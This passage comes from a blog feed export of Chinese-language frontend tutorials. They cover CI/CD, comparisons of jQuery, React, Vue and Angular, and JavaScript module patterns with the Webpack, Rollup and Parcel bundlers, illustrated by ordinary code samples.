中無法使用的功能。</p><p>預處理器可以想像成女孩子的底妝組、眼妝組等等，將相同類型的化妝品進行分類和優化增加組合搭配的方便性，後處理器則可以想像成是女孩子隨時能補的 BB 霜。</p><p>PostCSS 通常會和 Webpack、Grunt、Parcel、Gulp 等打包工具一起使用，著重在防呆和支援性。</p><h3 id="怎麼確保部屬出去的東西不會出問題"><a href="#怎麼確保部屬出去的東西不會出問題" class="headerlink" title="怎麼確保部屬出去的東西不會出問題?"></a>怎麼確保部屬出去的東西不會出問題?</h3><blockquote><p>CI&#x2F;CD 在做什麼? 該怎麼透過流程減少人為失誤?</p></blockquote><p>偷吃完都有記得擦嘴嗎?! 背地裡在檯面下做了一些事情又不想被發現或影響另一半怎麼辦?! 有沒有辦法自動化的把相關痕跡去除或隱藏?!</p><p>當然正常情況下是要盡量避免做一些見不得光的事情，但總是會有些人會如此，而 CI&#x2F;CD 的目的就是為了確保程式碼在提交之後，減少因為少部分檯面下的更動影響程式運行的流程，確保程式碼的品質。</p><p>CI (Continuous Integration)、CD (Continuous Delivery&#x2F;Deployment) 目的是從測試、建置到部署自動化，取代原來人工需要做的事情。</p><ul><li>CI (Continuous Integration): 專注在持續整合，目的是讓經過測試的程式碼用最快的時間回到主幹中，透過程式碼的自動化測試和建置，將穩定品質的程式碼合併，越早頻繁整合，整合難度的就越低且能確保最新版本是可運行的，常見的流程會是當嘗試將更改推送到 Git Repo 時，Linter 和測試就會運行</li><li>CD (Continuous Delivery&#x2F;Deployment): 專注在持續部屬和交付，更快速且頻繁的去更新我們的服務，依照需要的環境進行建置和部屬</li></ul><p>CI&#x2F;CD 通常採用工具自動化，<a href="https://linyencheng.github.io/2022/10/10/relationships-between-frontend-and-backend/devops-ci-cd-jenkins-circleci-and-github-action/">常見的工具有 Github Actions、Jenkins、Circle CI 等等</a>，過程中對程式碼運行測試，以確保在運作是正確的。</p><ul><li>Linter: ESLint</li><li>單元測試: Jest、Mocha、Jasmine</li><li>E2E 自動化測試: Cypress、puppeteer、playwright</li></ul><p>常見的流程會是</p><ul><li>依照條件觸發執行對應任務</li><li>排程工作 (Cron Job): 定時執行一些測試任務</li></ul><p>舉個排程的例子，前公司因為是處理看盤軟體，所以每天早上開盤前、開盤後都會排程進行一次完整的測試，確保開盤後系統的運作能夠正常、客戶能夠正常操作。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端函式庫與框架 X 框架御三家怎麼選</title>
      <link href="/2022/10/08/relationships-between-frontend-and-backend/js-library-and-framework/"/>
      <url>/2022/10/08/relationships-between-frontend-and-backend/js-library-and-framework/</url>
      
        <content type="html"><![CDATA[<p>前端的框架跟函式庫百百種，究竟該怎麼選?</p><p>其實這跟伴侶的選擇有點像，要選當下適合我們的而非一昧的追求最好，當需求與供給沒辦法對應時，勉強別人接受並不公平，勉強自己適應也很痛苦。</p><p>函式庫和框架的選擇也是，實際上遇到的問題絕對都有一種以上的解決方案，而哪種方式才是最適合的就該好好想想。</p><blockquote><p>在簡單的專案使用框架只會增加複雜度，在複雜專案的使用卻讓專案變得單純</p></blockquote><p>所以該不該使用框架，端看各位大大遇到問題的維度和情境。</p><h2 id="JavaScript-函式庫"><a href="#JavaScript-函式庫" class="headerlink" title="JavaScript 函式庫"></a>JavaScript 函式庫</h2><p>函式庫 (library) 是開發者將常用的功能打包成能重複使用的工具包，以便和他人共享自己的解決方案。</p><p>這種開源共享函式庫的生態也加速了技術演進，JavaScript 函式庫大多應用在協助操作 DOM、AJAX、CSS，幫助開發者更有效率的撰寫網頁，例如</p><ul><li>jQuery 提供了多載像是 <code>$(selector)</code> 或是 <code>$(element)</code> 簡化 DOM 操作、AJAX 的抽象 <code>$.ajax</code> 和解決跨瀏覽器的語法支援</li><li>date-fns 簡化了時間的處理</li><li>classnames: 使用 JavaScript 設定條件動態的操作 class</li><li>humps: 將收到的資料格式轉成駝峰式</li></ul><h3 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h3><p>當沒有框架的時候，開發通常會用 jQuery 當套件去</p><ul><li>快速的操作 DOM</li><li>撰寫 AJAX 相關功能</li><li>跨瀏覽器語法支援</li></ul><p>當專案規模開始變大，互動性變高，管理狀態以及資料流就會越來越困難，原來的這種開發方式會漸漸變得母湯，不僅維護難度提高效能也會下降。</p><blockquote><p>有人發表一個評論，並且有人又針對評論進行回覆，同時也有許多人針對兩則回覆按表情符號</p></blockquote><p>以取得取得評論為例，以下會是 jQuery 的寫法，當 UI 變得複雜的時候，renderComponents 這個 Function 就會變得越來越複雜，且以這樣的寫法只想更新有改變的資料會變得較為困難。</p><p>jQuery 的操作方式直覺，且寫起來的速度並不會比較慢，但由於缺少規範，最終可能會難以維護。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getCommentsByPostId</span>(<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fetch</span>(<span class="string">`/api/post/<span class="subst">$&#123;id&#125;</span>`</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderComments</span>(<span class="params">post</span>) &#123;</span><br><span class="line">  post.<span class="property">comments</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">comment</span>) =&gt;</span> &#123;</span><br><span class="line">    $(<span class="string">&quot;#root&quot;</span>).<span class="title function_">append</span>(</span><br><span class="line">      $(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>))</span><br><span class="line">        .<span class="title function_">append</span>(</span><br><span class="line">          $(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h3&quot;</span>)).<span class="title function_">text</span>(comment.<span class="property">userName</span>),</span><br><span class="line">          $(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>)).<span class="title function_">text</span>(comment.<span class="property">comment</span>)</span><br><span class="line">        )</span><br><span class="line">        .<span class="title function_">addClass</span>(<span class="string">&quot;card&quot;</span>)</span><br><span class="line">    );</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;.comments&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">getCommentsByPostId</span>(postId).<span class="title function_">then</span>(renderComments);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="JavaScript-框架"><a href="#JavaScript-框架" class="headerlink" title="JavaScript 框架"></a>JavaScript 框架</h2><p>Web 開發框架是抽象概念，是針對某些類型和需求的專案提供完整解決方案的函式庫。</p><p>這些解決方案能讓應用程式能夠擁有可預測性和均質化，這樣當規模擴大時可維護性能夠維持，框架能讓 JavaScript 開發變得更輕鬆。</p><p>當年 Facebook 也是發現現有技術無法解決當下網頁需要高互動性的問題，才著手進行了 React.js 的開發用簡單的語法來描述複雜的規則，提供達到提升執行效能又能降低維護難度的開發架構。</p><p>小編從 2015 開始入門前端，前端的技術選型開始進行轉換，目前看起來是一個三分天下的概念。</p><blockquote><p><img src="https://i.imgflip.com/3ca29b.jpg"><br>圖片來源: <a href="https://ithelp.ithome.com.tw/articles/10224417?sc=pt">https://ithelp.ithome.com.tw/articles/10224417?sc=pt</a></p></blockquote><ol><li>Angular: Google 推出第二代後，想得到的東西都裝在裡面了</li><li>React.js: Facebook 主導，React 只關注 UI，通常會和管理狀態的 Redux 一起用</li><li>Vue.js: 待過阿里 Weex 團隊的尤雨溪設計，透過 Vue-loader 撰寫 <code>.vue</code> 可以把 CSS 關起來可以免除自己寫 BEM</li></ol><p>這幾年下來前端的趨勢看來是元件驅動開發 (CDD)，元件化顯而易見的好處就是好維護可重用，並可將元件封裝成模組便於安裝和使用，React、Angular、Vue 三大主流框架大致都有以下特性</p><ul><li>元件驅動開發</li><li>資料流跟畫面分離</li><li>狀態管理機制</li><li>網站的效能提升</li></ul><p>以取得取得評論為例，底下舉 React 的寫法，當畫面變得複雜時我們只需要將元件再拆小，且 React 每次都只會更新有變化的部分。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Comment</span>(<span class="params">&#123; userName, comment &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;userName&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;comment&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Comments</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [comments, setComments] = <span class="title function_">useState</span>([]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getCommentsByPostId</span>(<span class="params">id</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fetch</span>(<span class="string">`/api/post/<span class="subst">$&#123;id&#125;</span>`</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          getCommentsByPostId(postId).then((&#123; comments &#125;) =&gt; &#123;</span></span><br><span class="line"><span class="language-xml">            setComments(comments);</span></span><br><span class="line"><span class="language-xml">          &#125;);</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        getCommentsByPostId</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;comments.map((comment) =&gt; (</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Comment</span> <span class="attr">key</span>=<span class="string">&#123;comment.id&#125;</span> &#123;<span class="attr">...comment</span>&#125; /&gt;</span></span></span><br><span class="line"><span class="language-xml">      ))&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="React"><a href="#React" class="headerlink" title="React"></a>React</h3><p>React 是用來實作使用者介面的 JavaScript 函式庫。</p><p>Facebook 於 2013 年發表，技術上來說 React 並不是框架，而是一個用來渲染 UI 元件的函式庫，在發表當時 Facebook 內部早已使用 React 解決許多內部問題。</p><p>React 提供了單向資料流的架構，透過 Single Source of Truth (SSOT) 的準則來確保資料來源和資料的流向。</p><p>使用上通常會配合其他函式庫來建立應用程式，例如</p><ul><li>React Native 建立手機程式</li><li>ReactDOM 建立網路應用程式</li></ul><p>另外 React 大量普及的使用 JSX 來撰寫和描述元件，熟悉 JSX 大大簡化了開發的過程，JSX 代表 JavaScript 和 XML，讓 JavaScript 中可以寫類似 HTML 的語法，JSX 主要是由 React 團隊發明的，但也可用在 Vue 的開發上。</p><p>這邊也附上傳送門，歡迎參考小編一路上學習的一些小小心得:<br><a href="https://linyencheng.github.io/categories/#React.js">https://linyencheng.github.io/categories/#React.js</a></p><h3 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h3><p>Vue 是漸進式 JavaScript 框架，一個平易近人、高性能且通用的使用者介面的框架。</p><p>初學者最舒服的學習小編認為是 Vue.js 或 jQuery，Vue 提供了雙向資料的機制，隨便寫個幾行程式就可以做出幾個小頁面。</p><p>不過雙向資料流並不限定資料源，可以從 model 而來，也可以從 input 而來，能夠讓我們很輕易地操作資料，但較難確定資料來源。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;input v-model=<span class="string">&quot;message&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title class_">Vue</span>.<span class="title class_">Component</span>(<span class="string">&#x27;Input&#x27;</span>, &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">data</span>: <span class="function">() =&gt;</span> (&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">message</span>: <span class="string">&#x27;hello world&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>Vue 除了與 Angular 一樣，使用了一些自定義的 HTML 以外，大部分還是使用現代化的標準 JavaScript，所以在學習上是最輕鬆寫意的，小編初期在入門時也是從 Vue 開始。</p><p>在使用上 Vue 也提供了透過 template 形式不需要建置的使用方式，可以讓我們快速的 POC 以及練習撰寫元件。</p><p><a href="https://github.com/LinYenCheng/vue-note">https://github.com/LinYenCheng/vue-note</a></p><p>在整合原生手機程式上，Vue 的作者尤雨溪也加入了 <a href="https://doc.weex.io/zh/">Weex</a> 團隊，目的是讓開發者能使用一致的 Web 開發體驗 (Vue) 來開發高效能原生應用，並能夠透過同一份程式編譯並在不同平台上面運行，所以其實可以用 Vue 的語法去撰寫原生的 Android&#x2F;iOS APP。</p><h3 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h3><p>Angular 是一個基於 TypeScript 的開發平台，小編並沒有特別實作過小專案，僅簡單看過文件。</p><p>不過 Angular 身為前端御三家，也是同樣是以元件的概念來開發，不過不僅僅是元件而是一套完整的開發平台。</p><p>一個 Angular 的元件由三部份構成，分別是：模板、樣式、類別。</p><p>舉例來說，<code>app.component.ts</code>、<code>app.component.html</code>、以及 <code>app.component.css</code> 一同構成 AppComponent。</p><p>Angular 主要是透過模板的語法來撰寫 HTML 並且透過 <a href="https://angular.io/guide/dependency-injection">Dependency Injection</a> 的設計模式，把程式中的某些服務或是值交付給需要使用的地方。</p><p>也因為 Angular 是開發平台的概念，已經將大部分可能會需要的東西封裝在裡面，譬如今天<a href="https://angular.io/guide/service-worker-getting-started">需要 PWA 功能</a>就只要輸入 <code>ng add @angular/pwa</code>。</p><p>不過 Angular 和 React 跟 Vue 相比，開發者必須懂相對多的 “假設” 還有 “結構”，甚至維護到的專案可能只是打個 API 也會需要理解什麼是 RX，小編認為會比較適合較有規模且同事水平較一致的團隊。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端模組化與打包工具 (Webpack、Rollup、Parcel)</title>
      <link href="/2022/10/05/relationships-between-frontend-and-backend/js-module-loader/"/>
      <url>/2022/10/05/relationships-between-frontend-and-backend/js-module-loader/</url>
      
        <content type="html"><![CDATA[<p>模組可以理解是在情場小白在跟女孩相處的過程中卻意外擁有把妹高手前同事提供的 “教戰守則”，同事總會在一些時間、情境時告訴你一些小撇步讓男女之間感情升溫。</p><p>打包工具則是在這些 “鍛鍊” 的過程中，讓 “教戰守則” 能夠自然且最佳化的融入到自身進而能夠靈活的運用。</p><h2 id="模組化載入"><a href="#模組化載入" class="headerlink" title="模組化載入"></a>模組化載入</h2><p>封裝元件最簡單的方式是透過 IIFE 和 Module Pattern 來產生元件模組。</p><p>在網路上一篇關於<a href="http://fireqqtw.logdown.com/posts/255789-amd-umd-commonjs">模組化載入</a> 的文章中介紹:</p><ul><li>AMD (Asynchronous Module Definition): 非同步模組定義，適用於 RequireJS 這類工具供瀏覽器使用</li><li><a href="https://github.com/cmdjs/specification/blob/master/draft/module.md">CMD (Common Module Definition)</a>: 通用模組定義<ul><li><a href="http://wiki.commonjs.org/wiki/CommonJS">CommonJS</a>: 非瀏覽器的環境中 Node 和 Browserify&#x2F;Webpack</li></ul></li><li><a href="https://github.com/umdjs/umd">Universal Module Definition (UMD)</a>: <a href="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js">jQuery</a> 可以看得出來就是運用 UMD 來封裝</li><li>ES Module: ES6 支援的模組語法，原生寫法就可以達到相同效果</li></ul><h3 id="IIFE-Immediately-Invoked-Function-Expression"><a href="#IIFE-Immediately-Invoked-Function-Expression" class="headerlink" title="IIFE (Immediately Invoked Function Expression)"></a>IIFE (Immediately Invoked Function Expression)</h3><p>IIFE 是一個定義完馬上就執行的 JavaScript function，適合像是透過非同步 CDN 載入的模組使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> returnValueOfIIFE = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> value = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// output:</span></span><br><span class="line">returnValueOfIIFE; <span class="comment">// &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Module-Pattern"><a href="#Module-Pattern" class="headerlink" title="Module Pattern"></a>Module Pattern</h3><p>搭配閉包 (Closure) 和作用域的特性而產生出來的設計模式，運用 function 會產生 closure 的特性區分出 private, public 的變數以及函式，將方法和變數限制在一個範圍內存取與使用。</p><p>底線開頭的變數和功能都是隱藏起來的實作，只有在 function 的作用域中可以存取，最後回傳模組的公開的介面 (API) 提供使用。</p><p>底下示範了一個運用 IIFE (Immediately Invoked Function Expression) 來實作的計數器模組，使用 IIFE 的目的是希望一定義就執行，這就是最基本的 Module pattern 了，可以發現 count 就是我們 private 的變數，指能夠透過回傳的 public function 來進行操作。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleCounter = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">getValue</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> count;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">increment</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> ++count;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">reset</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reset:&quot;</span> + count);</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">moduleCounter.<span class="title function_">getValue</span>();</span><br><span class="line">moduleCounter.<span class="title function_">increment</span>();</span><br><span class="line">moduleCounter.<span class="title function_">reset</span>();</span><br></pre></td></tr></table></figure><h2 id="模組打包工具"><a href="#模組打包工具" class="headerlink" title="模組打包工具"></a>模組打包工具</h2><p>當載入和打包模組時就需要打包工具，前端三大框架開發時也都推薦使用，常見解決方案為 Webpack、Rollup、Parcel 三種。</p><blockquote><p><img src="https://blog.logrocket.com/wp-content/uploads/2020/10/benchmarking-bundlers-2020.png"><br>圖片來源: <a href="https://blog.logrocket.com/benchmarking-bundlers-2020-rollup-parcel-webpack/">https://blog.logrocket.com/benchmarking-bundlers-2020-rollup-parcel-webpack/</a></p></blockquote><p>前端的專案通常在部屬之前都需要先建置 (build)，這個過程就是將相關模組進行整合並編譯成瀏覽器支援度較好的版本同時進行最佳化。</p><p>在比較大型的前端專案當中，建置工具可以說是必備，主要協助的工作像是</p><ul><li>tree-shaking 只加入有用到的部分</li><li>Dead Code elimination 移除不會使用的</li><li>Code Splitting 程式碼拆分</li><li>Minify 最小化</li></ul><h3 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h3><p>Webpack 是幾年前開源主流的打包工具，提供了前端模組化開發方式，將各種靜態資源打包成模組並生成優化過的程式碼，可以從指令或更改 webpack.config.js 來設定各項功能。</p><ul><li>提供模組載入的功能，方便的管理程式間複雜的相依性</li><li>提供 Hot Reload <del>也就是程式的熱插拔</del></li><li>提供各式 loader 支援程式碼預處理或後處理 (UglifyJS、Babel Loader)</li></ul><p>Webpack 是透過 Node.js 來打包前端元件 (模組) 的工具，使用前須先安裝 Node.js。</p><p>不過在前年年底發現了 Webpack，開始使用之後就想：</p><p>那到底還要不要清楚了解 AMD、UMD 等等複雜的規範？<del>好像就不重要了 Orz</del> 使用 Webpack 後發現根本沒管那些同步不同步的概念 <del>(所以真的不重要嗎 Orz)</del>，最後會輸出成一包最佳化的 Bundle 輸出就可以直接用，是方便好用又很猛的工具。</p><p>使用方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 官網範例</span></span><br><span class="line"><span class="comment">// src/index.js</span></span><br><span class="line"><span class="keyword">import</span> bar <span class="keyword">from</span> <span class="string">&quot;./bar.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">bar</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// src/bar.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>export</code>就負責輸出，<code>import</code>負責載進來。</p><p>會需要寫一個 <code>webpack.config.js</code> 的配置檔，entry 就是入口，要機器幫你 build 總要說從哪開始，最後 output 的就是包成一包的檔案了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/index.js&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;dist&quot;</span>),</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Rollup"><a href="#Rollup" class="headerlink" title="Rollup"></a>Rollup</h3><blockquote><p>Rollup is a module bundler for JavaScript which compiles small pieces of code into something larger and more complex, such as a library or application.</p></blockquote><p>用途主要是用來封裝模組出來給他人使用，所以配置檔中也特別強調可以輸出各種不同的格式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rollup.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">input</span>: <span class="string">&quot;./src/index.js&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">file</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="comment">// CommonJS，適用於 Node 和 Browserify/Webpack</span></span><br><span class="line">    <span class="attr">format</span>: <span class="string">&quot;cjs&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>配置檔一樣是指定入口跟結果位置，此外也因應模組會用在不同環境所以提供多種模組封裝的 format</p><ul><li>amd: 異步模塊定義，用於像 RequireJS 這樣的模塊加載器</li><li>cjs: CommonJS，適用於 Node 和 Browserify&#x2F;Webpack</li><li>es: ES 模塊文件</li><li>iife: 自執行模塊，適用於瀏覽器環境 script 標籤</li><li>umd: 通用模塊定義，以 amd，cjs 和 iife 為一體</li></ul><h3 id="Parcel"><a href="#Parcel" class="headerlink" title="Parcel"></a>Parcel</h3><blockquote><p>The zero configuration build tool for the web.</p></blockquote><p>只要寫完 html 之後不用設定什麼，執行指令就可以幫你自動熱插拔和打包 JavaScript 模組的功能，開發時就不用一直重新整理。</p><ol><li><code>npm install --save-dev parcel</code></li><li>加入 html<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>My First Parcel App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span 